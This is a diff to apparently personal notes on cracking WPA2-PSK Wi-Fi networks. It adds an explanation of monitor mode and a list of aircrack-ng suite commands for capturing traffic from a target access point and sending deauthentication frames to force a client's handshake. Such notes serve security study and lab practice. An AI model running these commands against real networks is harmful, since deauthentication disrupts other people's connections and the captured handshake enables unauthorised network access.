@@ -13,7 +13,8 @@ Checking network access
 Hacking Process / Methodology for WPA2-PSK (Pre-Shared Key)
 ---------------------------------------------
 1) Place
-Place your wireless card into monitor/promiscious mode
+Place your wireless card into monitor/promiscious mode. Monitor mode allows our wireless card to perform monitoring all the incoming traffic. We will eavesdrop the network
+with the aim of gathering handshake.
 2) Discover
 Discover information about network (Channel, BSSID)
 3) Select
@@ -24,4 +25,17 @@ Perform deauthentication attack
 Capture WPA handshake
 6) Attempting crack
 Attempt to crack handshake
+
+Commands
+--------
+iwconfig
+airmon-ng check kill
+airmon-ng start wlan0 -> place network card into monitor mode
+iwconfig -> to make sure you are in monitor mode
+airodump-ng wlan0mon
+airodump-ng -c <channel_number> --bssid <MAC_Address> -w capture wlan0mon
+aireplay-ng -0 1 -a <MAC_Address> -c <client_we_deauth> wlan0mon -> at the end of this, we aim to gather handshake
+
+
+
 
